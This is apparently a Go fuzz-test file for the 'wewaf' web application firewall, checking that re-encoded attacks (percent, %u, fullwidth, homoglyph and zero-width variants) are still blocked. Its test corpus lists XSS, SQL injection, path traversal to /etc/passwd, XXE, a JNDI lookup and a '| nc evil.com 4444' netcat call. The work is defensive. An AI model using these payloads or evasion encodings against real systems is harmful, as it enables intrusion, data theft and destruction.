package engine

import (
	"fmt"
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"testing"

	"wewaf/internal/core"
)

// evasionBlocked runs payload as a query arg through BOTH phases — args-targeted
// rules fire in either the header phase (XSS-002, SQLI-024) or the body phase
// (SQLI-001, CRS-942100), so a single-phase check would miss real coverage.
func evasionBlocked(eng *Engine, payload string) bool {
	u := "/probe?x=" + url.QueryEscape(payload)
	req := httptest.NewRequest(http.MethodGet, u, nil)
	tx := core.NewTransaction(nil, req, nil)
	if eng.ProcessRequestHeaders(tx) != nil {
		return true
	}
	return eng.ProcessRequestBody(tx) != nil
}

// FuzzWAFEvasionArgs is a metamorphic bypass hunter. It asserts a SECURITY
// property, not just no-panic: if the engine blocks an attack in its canonical
// form, it must also block every SEMANTICS-PRESERVING re-encoding — because
// those encodings are exactly the ones the arg/uri canonicalization
// (FoldHomoglyphs∘Canonicalize) is built to reverse.
//
// The mutations applied (mutateArgEncoding) are each individually reversed by
// that pipeline, so a mutated payload the engine FAILS to block is a genuine
// canonicalization/decoding gap — the backend decodes it to the same attack the
// WAF blocks in plain form. This is the bug class behind the UNION DISTINCT and
// js-protocol-control findings. The selector byte per character drives the mix.
//
// Run:  go test ./internal/engine -run x -fuzz FuzzWAFEvasionArgs -fuzztime 60s
func FuzzWAFEvasionArgs(f *testing.F) {
	eng := newFuzzEngine(f)
	attacks := evasionCorpus()

	for i := range attacks {
		f.Add(i, []byte{0})                   // identity
		f.Add(i, []byte{1, 2, 3, 4, 5, 6, 7}) // a spread of every transform
		f.Add(i, []byte{5, 5, 5, 5, 5, 5})    // all-fullwidth (NFKC)
		f.Add(i, []byte{2, 2, 2, 2, 2, 2})    // all-percent
	}

	f.Fuzz(func(t *testing.T, idx int, sel []byte) {
		if idx < 0 || idx >= len(attacks) || len(sel) == 0 {
			return
		}
		payload := attacks[idx]
		if !evasionBlocked(eng, payload) {
			return // only anchor on payloads the WAF actually blocks
		}
		mutated := mutateArgEncoding(payload, sel, true)
		if mutated == payload {
			return
		}
		if !evasionBlocked(eng, mutated) {
			t.Fatalf("EVASION: %q (semantics-preserving re-encoding of %q via %v) was NOT blocked", mutated, payload, sel)
		}
	})
}

// FuzzCanonicalizeReversal is the unit-level companion: it asserts the arg
// canonicalizer fully REVERSES each encoding, i.e. canonicalizing an encoded
// form yields the same string as canonicalizing the plain form. A mismatch is a
// canonicalization gap regardless of whether a signature happens to cover it —
// it means an encoded attack reaches the rules in a different shape than the
// plain one the rules were written against. Pure-function, so it explores fast.
func FuzzCanonicalizeReversal(f *testing.F) {
	for _, s := range []string{
		"<script>", "../../etc/passwd", "union select", "javascript:", "${jndi:ldap}",
		"' or '1'='1", "<img src=x onerror=alert(1)>", "%", "+", "a b\tc",
	} {
		f.Add(s, []byte{1, 2, 3, 4, 5, 6, 7})
	}
	canon := func(s string) string { return FoldHomoglyphs(Canonicalize(s)) }
	f.Fuzz(func(t *testing.T, base string, sel []byte) {
		if len(sel) == 0 || len(base) > 256 || !isASCII(base) {
			return
		}
		// Only test bases that are ALREADY canonical (a fixed point). Otherwise
		// the base itself carries an encoding/special char (e.g. "%00" decodes to
		// NUL→stripped, "a+b" form-decodes) that canon transforms, which my
		// re-encoder can't faithfully reproduce — that's an oracle artefact, not a
		// WAF gap. A canonical base round-tripping through any reversible encoding
		// is the sound property.
		if canon(base) != base {
			return
		}
		// allowCase=false: Canonicalize does not fold case (the rules are (?i)),
		// so a case-flip is not an "encoding" it must reverse — only true
		// encodings (percent/%u/fullwidth/zero-width/whitespace) must round-trip.
		encoded := mutateArgEncoding(base, sel, false)
		if encoded == base {
			return
		}
		if got, want := canon(encoded), canon(base); got != want {
			t.Fatalf("canonicalization gap: canon(encode(%q)) = %q, but canon(%q) = %q (sel %v)", base, got, base, want, sel)
		}
	})
}

// reverseHomoglyph maps an ASCII letter to a confusable the engine folds back,
// built from the engine's own homoglyphMap so the substitution is guaranteed
// reversible by FoldHomoglyphs.
var reverseHomoglyph = func() map[rune]rune {
	m := map[rune]rune{}
	for confusable, ascii := range homoglyphMap {
		if _, seen := m[ascii]; !seen {
			m[ascii] = confusable
		}
	}
	return m
}()

// FuzzWAFEvasionBodyNorm is the body-sink companion to FuzzWAFEvasionArgs. The
// body is matched raw AND via NormalizeForMatch (body.norm) — a DIFFERENT
// canonicalization path than args (NFKC + homoglyph + whitespace/zero-width
// folding, but NO URL-decode). It asserts the same metamorphic property over
// exactly the transforms NormalizeForMatch reverses, so a miss is a real body
// normalization gap.
//
// Run:  go test ./internal/engine -run x -fuzz FuzzWAFEvasionBodyNorm -fuzztime 60s
func FuzzWAFEvasionBodyNorm(f *testing.F) {
	eng := newFuzzEngine(f)
	attacks := evasionCorpus()
	for i := range attacks {
		f.Add(i, []byte{0})
		f.Add(i, []byte{1, 2, 3, 4, 5})
		f.Add(i, []byte{2, 2, 2, 2}) // all-fullwidth
	}
	f.Fuzz(func(t *testing.T, idx int, sel []byte) {
		if idx < 0 || idx >= len(attacks) || len(sel) == 0 {
			return
		}
		payload := attacks[idx]
		if !blockedInRawBody(eng, payload) {
			return
		}
		mutated := mutateBodyNorm(payload, sel)
		if mutated == payload {
			return
		}
		if !blockedInRawBody(eng, mutated) {
			t.Fatalf("BODY EVASION: %q (NormalizeForMatch-reversible re-encoding of %q via %v) was NOT blocked", mutated, payload, sel)
		}
	})
}

// mutateBodyNorm applies only transforms NormalizeForMatch reverses: case-flip
// (rules are (?i)), NFKC-fullwidth, engine-known homoglyph, whitespace-class,
// and zero-width insertion. No percent/%u — the body is not URL-decoded.
func mutateBodyNorm(s string, sel []byte) string {
	var b strings.Builder
	b.Grow(len(s) * 2)
	i := 0
	for _, r := range s {
		op := sel[i%len(sel)] % 6
		i++
		switch op {
		case 1: // case-flip
			if r >= 'a' && r <= 'z' {
				b.WriteRune(r - 32)
			} else if r >= 'A' && r <= 'Z' {
				b.WriteRune(r + 32)
			} else {
				b.WriteRune(r)
			}
		case 2: // NFKC-fullwidth
			switch {
			case r >= 0x21 && r <= 0x7E:
				b.WriteRune(r + 0xFEE0)
			case r == ' ':
				b.WriteRune('　')
			default:
				b.WriteRune(r)
			}
		case 3: // engine-known homoglyph (regression guard for homoglyphMap)
			if h, ok := reverseHomoglyph[r]; ok {
				b.WriteRune(h)
			} else {
				b.WriteRune(r)
			}
		case 4: // zero-width prefix (dropped by normalizeControlAndSpace)
			b.WriteRune('​')
			b.WriteRune(r)
		case 5: // whitespace-class variant for a space (→ folds to space)
			if r == ' ' {
				b.WriteRune('\v') // RE2 \s excludes \v — the documented gap class
			} else {
				b.WriteRune(r)
			}
		default:
			b.WriteRune(r)
		}
	}
	return b.String()
}

// mutateArgEncoding re-encodes s with a per-character mix of transforms, each of
// which the arg/uri pipeline (lenientUnescape 3-pass + decodePercentU + NFKC +
// FoldHomoglyphs + whitespace/zero-width normalisation) reverses. sel[i] selects
// the transform for character i. url.QueryEscape (applied by the arg harness)
// adds at most one extra percent layer, which the 3-pass decode still unwinds.
func mutateArgEncoding(s string, sel []byte, allowCase bool) string {
	var b strings.Builder
	b.Grow(len(s) * 4)
	i := 0
	for _, r := range s {
		// '+' and '%' have special meaning in the arg pipeline ('+'→space form-
		// decode; '%' starts an escape). Re-encoding them is NOT semantics-
		// preserving (fullwidth/percent-'+' becomes a literal '+', not a space),
		// so leave them verbatim — the metamorphic property only covers ordinary
		// payload bytes.
		if r == '+' || r == '%' {
			b.WriteRune(r)
			i++
			continue
		}
		op := sel[i%len(sel)] % 8
		i++
		switch op {
		case 1: // case-flip ASCII letters (only when the oracle tolerates it)
			if allowCase && r >= 'a' && r <= 'z' {
				b.WriteRune(r - 32)
			} else if allowCase && r >= 'A' && r <= 'Z' {
				b.WriteRune(r + 32)
			} else {
				b.WriteRune(r)
			}
		case 2, 3: // percent-encode each UTF-8 byte
			// NOTE: single-level only. A per-character mix of DOUBLE percent
			// (3 decode passes) with %u (decoded only after lenientUnescape
			// settles) exhausts the engine's deliberate 3-pass DoS bound — an
			// unrealistic combination (real attacks use one encoding family), so
			// it would be an oracle artefact, not a bypass. Double-encoding is
			// covered by FuzzCanonicalize / FuzzDecodePercentU.
			for _, by := range []byte(string(r)) {
				fmt.Fprintf(&b, "%%%02X", by)
			}
		case 4: // IIS %uXXXX (decodePercentU)
			if r <= 0xFFFF {
				fmt.Fprintf(&b, "%%u%04X", r)
			} else {
				b.WriteRune(r)
			}
		case 5: // fullwidth form (NFKC folds it back)
			switch {
			case r >= 0x21 && r <= 0x7E:
				b.WriteRune(r + 0xFEE0)
			case r == ' ':
				b.WriteRune('　') // ideographic space → NFKC space
			default:
				b.WriteRune(r)
			}
		case 6: // prepend a zero-width space (dropped by normalizeControlAndSpace)
			b.WriteRune('​')
			b.WriteRune(r)
		case 7: // turn a space into a different whitespace class (→ collapses to space)
			if r == ' ' {
				b.WriteRune('\t')
			} else {
				b.WriteRune(r)
			}
		default: // identity
			b.WriteRune(r)
		}
	}
	return b.String()
}

// evasionCorpus is the spread of attack classes the WAF blocks in canonical
// form; the metamorphic fuzzer re-encodes the chosen one. Kept in sync with
// TestWAFEvasionCorpusIsLive so the fuzzer never silently goes vacuous.
func evasionCorpus() []string {
	return []string{
		`<script>alert(1)</script>`,
		`<img src=x onerror=alert(1)>`,
		`javascript:alert(document.cookie)`,
		`1' UNION SELECT password FROM users-- -`,
		`1' OR '1'='1`,
		`'; DROP TABLE users-- -`,
		`../../../../etc/passwd`,
		`....//....//etc/passwd`,
		`{{7*7}}`,
		`${jndi:ldap://evil/a}`,
		`; cat /etc/passwd`,
		`| nc evil.com 4444`,
		`<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]>`,
		`{"$where":"this.a==1"}`,
		`php://filter/convert.base64-encode/resource=index.php`,
		`1 INTERSECT SELECT a,b FROM users`,
		`<details open ontoggle=alert(1)>`,
	}
}

// TestWAFEvasionCorpusIsLive guards the metamorphic fuzzer against silently
// going vacuous: the core injection classes MUST block in an arg in canonical
// form, otherwise FuzzWAFEvasionArgs skips them (and the WAF has a real gap).
func TestWAFEvasionCorpusIsLive(t *testing.T) {
	eng := newFuzzEngine(t)
	for _, p := range []string{
		`<script>alert(1)</script>`,
		`<img src=x onerror=alert(1)>`,
		`javascript:alert(document.cookie)`,
		`1' UNION SELECT password FROM users-- -`,
		`1' OR '1'='1`,
		`../../../../etc/passwd`,
		`{{7*7}}`,
		`${jndi:ldap://evil/a}`,
		`1 INTERSECT SELECT a,b FROM users`,
	} {
		if !evasionBlocked(eng, p) {
			t.Errorf("corpus payload not blocked in arg (metamorphic fuzzer is vacuous for it): %q", p)
		}
	}
}
